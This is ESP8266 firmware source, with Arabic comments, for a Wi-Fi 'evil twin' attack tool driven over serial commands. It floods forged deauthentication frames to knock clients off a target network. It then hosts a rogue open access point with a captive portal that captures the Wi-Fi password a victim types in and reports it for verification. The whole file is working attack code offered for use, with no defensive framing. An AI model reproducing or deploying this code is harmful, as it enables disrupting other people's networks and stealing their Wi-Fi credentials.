#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include "serial_handler.h"
#include "definitions.h"
#include "types.h"

// ================= VARIABLES ================= //
bool attack_running = false;
bool infinite_attack = false;
unsigned long attack_start_time = 0;
unsigned long attack_duration_ms = 0;
uint8_t target_bssid[6];
int target_channel = 1;

bool hosting_running = false;
AsyncWebServer server(80);
DNSServer dnsServer;
String captured_name = "";
int verification_status = 0;

const IPAddress AP_IP(4, 3, 2, 1);
const IPAddress AP_NETMASK(255, 255, 255, 0);

volatile bool victim_connected = false;
unsigned long connection_timestamp = 0;
const unsigned long PAUSE_DURATION = 30000;

// متغير للكشف عن الهدف قبل الهجوم
volatile bool target_seen = false;

deauth_frame_t deauth_frame;

// ================= HELPER FUNCTIONS ================= //
void strToMac(String macStr, uint8_t *mac)
{
    unsigned int values[6];
    if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]))
    {
        for (int i = 0; i < 6; ++i)
            mac[i] = (uint8_t)values[i];
    }
}

void applyWifiFix()
{
    // ESP8266 doesn't need the same wifi init config as ESP32
    // This function is kept for compatibility but does nothing on ESP8266
}

#ifdef LED
void blink_led(int num_times, int blink_duration) {
  for(int i = 0; i < num_times; i++) {
    digitalWrite(LED, HIGH);
    delay(blink_duration);
    digitalWrite(LED, LOW);
    if(i < num_times - 1) delay(blink_duration);
  }
}
#endif

// ================= SNIFFER CALLBACKS ================= //

// 1. سنيفر الفحص (للتأكد من وجود الشبكة)
void check_sniffer(uint8_t *buf, uint16_t len)
{
    if (target_seen)
        return; // خلاص شفناه

    if (len < sizeof(mac_hdr_t))
        return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
	mac_hdr_t *mac_header = (mac_hdr_t *)pkt->payload;

    // فحص ما إذا كان الباكت يخص الهدف (سواء مرسل منه أو إليه)
    if (memcmp(mac_header->dest, target_bssid, 6) == 0 || memcmp(mac_header->src, target_bssid, 6) == 0 || memcmp(mac_header->bssid, target_bssid, 6) == 0)
    {
        target_seen = true;
    }
}

// 2. سنيفر الهجوم
void attack_sniffer(uint8_t *buf, uint16_t len)
{
    if (!attack_running)
        return;
    if (victim_connected && (millis() - connection_timestamp < PAUSE_DURATION))
        return;

    if (len < sizeof(mac_hdr_t))
        return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
	mac_hdr_t *mac_header = (mac_hdr_t *)pkt->payload;

    bool is_target = false;
    uint8_t *victim_mac = NULL;

    if (memcmp(mac_header->dest, target_bssid, 6) == 0)
    {
        is_target = true;
        victim_mac = mac_header->src;
    }
    else if (memcmp(mac_header->src, target_bssid, 6) == 0)
    {
        is_target = true;
        victim_mac = mac_header->dest;
    }

    if (is_target && victim_mac != NULL)
    {
        if (victim_mac[0] & 0x01)
            return;
        
        // بناء إطار deauth
		deauth_frame.frameControl = 0xC0;  // Deauth frame type
		deauth_frame.duration = 0;
		memcpy(deauth_frame.destination, victim_mac, 6);
		memcpy(deauth_frame.source, target_bssid, 6);
		memcpy(deauth_frame.bssid, target_bssid, 6);
		deauth_frame.seq = 0;
		deauth_frame.reason = 7;

        // إرسال إطار deauth متعدد
        for(int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
            wifi_send_pkt_freedom((uint8_t*)&deauth_frame, sizeof(deauth_frame), 0);
            delay(1);
        }
        
        #ifdef LED
        BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
        #endif
    }
}

// ================= ASYNC WEB HANDLERS ================= //
void setupServer()
{
    server.on("/generate_204", HTTP_ANY, [](AsyncWebServerRequest *request)
              { request->redirect("http://4.3.2.1/"); });
    server.on("/gen_204", HTTP_ANY, [](AsyncWebServerRequest *request)
              { request->redirect("http://4.3.2.1/"); });
    server.on("/ncsi.txt", HTTP_ANY, [](AsyncWebServerRequest *request)
              { request->redirect("http://4.3.2.1/"); });
    server.on("/hotspot-detect.html", HTTP_ANY, [](AsyncWebServerRequest *request)
              { request->redirect("http://4.3.2.1/"); });
    server.on("/connecttest.txt", HTTP_ANY, [](AsyncWebServerRequest *request)
              { request->redirect("http://logout.net"); });

    server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request)
              { request->send(LittleFS, "/index.html", "text/html"); });

    server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request)
              {
        if (request->hasArg("name")) {
            captured_name = request->arg("name");
            verification_status = 1;
            Serial.println("[CAPTURED] " + captured_name);
            request->send(200, "text/plain", "received");
        } else {
            request->send(400, "text/plain", "error");
        } });

    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request)
              {
        String statusMsg = "IDLE";
        if (verification_status == 1) statusMsg = "WAIT";
        else if (verification_status == 2) statusMsg = "OK";
        else if (verification_status == 3) statusMsg = "NO";
        request->send(200, "text/plain", statusMsg); });

    server.onNotFound([](AsyncWebServerRequest *request)
                      { request->redirect("http://4.3.2.1/"); });

    server.begin();
}

// ================= SERIAL LOGIC ================= //
void serial_cmd_init()
{
    Serial.println("[SYSTEM] READY");

    if (!LittleFS.begin())
    {
        Serial.println("[ERROR] FS_MOUNT_FAILED");
    }
    else
    {
        Serial.println("[INFO] FS_MOUNTED");
    }

    // ESP8266 WiFi event handlers
    WiFi.onSoftAPModeStationConnected([](const WiFiEventSoftAPModeStationConnected& evt) {
        Serial.println("[EVENT] VICTIM_CONNECTED");
        victim_connected = true;
        connection_timestamp = millis();
    });

    WiFi.onSoftAPModeStationDisconnected([](const WiFiEventSoftAPModeStationDisconnected& evt) {
        Serial.println("[EVENT] VICTIM_DISCONNECTED");
        victim_connected = false;
    });
}

void serial_cmd_handle()
{
    if (hosting_running)
        dnsServer.processNextRequest();

    if (attack_running && !infinite_attack)
    {
        if (millis() - attack_start_time > attack_duration_ms)
        {
            attack_running = false;
            if (!hosting_running)
                wifi_promiscuous_enable(false);
            Serial.println("[INFO] ATTACK_FINISHED_TIME");
        }
    }

    if (Serial.available())
    {
        String rawInput = Serial.readStringUntil('\n');
        rawInput.trim();
        String cmdInput = rawInput;
        cmdInput.toUpperCase();

        // --- ATTACK OFF ---
        if (cmdInput == "ATTACK OFF")
        {
            attack_running = false;
            if (!hosting_running)
                wifi_promiscuous_enable(false);
            Serial.println("[SUCCESS] ATTACK_STOPPED");
            return;
        }

        // --- OK ---
        if (cmdInput == "OK")
        {
            if (verification_status == 1)
            {
                verification_status = 2;
                Serial.println("[SUCCESS] PASSWORD_ACCEPTED");
                delay(3000);
                attack_running = false;
                hosting_running = false;
                wifi_promiscuous_enable(false);
                server.end();
                WiFi.softAPdisconnect(true);
                WiFi.mode(WIFI_OFF);
                Serial.println("[INFO] SYSTEM_RESET");
            }
            else
            {
                Serial.println("[ERROR] NO_PENDING_VERIFICATION");
            }
            return;
        }

        // --- NO ---
        if (cmdInput == "NO")
        {
            if (verification_status == 1)
            {
                verification_status = 3;
                Serial.println("[SUCCESS] PASSWORD_REJECTED");
            }
            else
            {
                Serial.println("[ERROR] NO_PENDING_VERIFICATION");
            }
            return;
        }

        // --- STOP ALL ---
        if (cmdInput == "STOP")
        {
            attack_running = false;
            if (!hosting_running)
                wifi_promiscuous_enable(false);
            Serial.println("[SUCCESS] ALL_STOPPED");
            return;
        }

        // --- ATTACK START (With Verification) ---
        if (cmdInput.startsWith("ATTACK "))
        {
            int s1 = rawInput.indexOf(' ');
            int s2 = rawInput.indexOf(' ', s1 + 1);
            int s3 = rawInput.indexOf(' ', s2 + 1);

            if (s1 > 0 && s2 > 0 && s3 > 0)
            {
                String bssid = rawInput.substring(s1 + 1, s2);
                String ch = rawInput.substring(s2 + 1, s3);
                String dur = rawInput.substring(s3 + 1);
                strToMac(bssid, target_bssid);
                target_channel = ch.toInt();
                int d = dur.toInt();

                // 1. مرحلة الفحص (Verification Phase)
                if (!hosting_running)
                {
                    WiFi.mode(WIFI_STA);
                    WiFi.disconnect();
                }
                
                wifi_set_channel(target_channel);
                wifi_promiscuous_enable(true);

                target_seen = false;
                wifi_set_promiscuous_rx_cb(check_sniffer);

                // انتظار 2 ثانية للفحص
                unsigned long scanStart = millis();
                while (millis() - scanStart < 2000)
                {
                    if (target_seen)
                        break;
                    delay(10);
                }

                // طباعة النتيجة للبايثون
                if (target_seen)
                    Serial.println("[STATUS] TARGET_FOUND");
                else
                    Serial.println("[STATUS] TARGET_NOT_FOUND");

                // 2. بدء الهجوم
                infinite_attack = (d == 0);
                attack_duration_ms = d * 1000;
                wifi_set_promiscuous_rx_cb(attack_sniffer);

                attack_running = true;
                attack_start_time = millis();
                Serial.println("[SUCCESS] ATTACK_STARTED");
            }
            else
            {
                Serial.println("[ERROR] INVALID_SYNTAX_ATTACK");
            }
            return;
        }

        // --- HOST START ---
        if (cmdInput.startsWith("HOST "))
        {
            int s1 = rawInput.indexOf(' ');
            int s2 = rawInput.lastIndexOf(' ');

            if (s1 > 0 && s2 > s1)
            {
                String ssid = rawInput.substring(s1 + 1, s2);
                String chStr = rawInput.substring(s2 + 1);
                int ch = chStr.toInt();

                WiFi.mode(WIFI_OFF);
                applyWifiFix();
                WiFi.mode(WIFI_AP_STA);
                WiFi.softAPConfig(AP_IP, AP_IP, AP_NETMASK);
                WiFi.softAP(ssid.c_str(), NULL, ch, 0, 4);

                dnsServer.setTTL(300);
                dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
                dnsServer.start(53, "*", AP_IP);
                setupServer();

                hosting_running = true;
                verification_status = 0;
                victim_connected = false;
                
                wifi_promiscuous_enable(true);
                wifi_set_promiscuous_rx_cb(attack_sniffer);

                Serial.printf("[SUCCESS] HOST_STARTED %s\n", ssid.c_str());
            }
            else
            {
                Serial.println("[ERROR] INVALID_SYNTAX_HOST");
            }
            return;
        }

        // أمر غير معروف
        Serial.println("[ERROR] UNKNOWN_COMMAND");
    }
}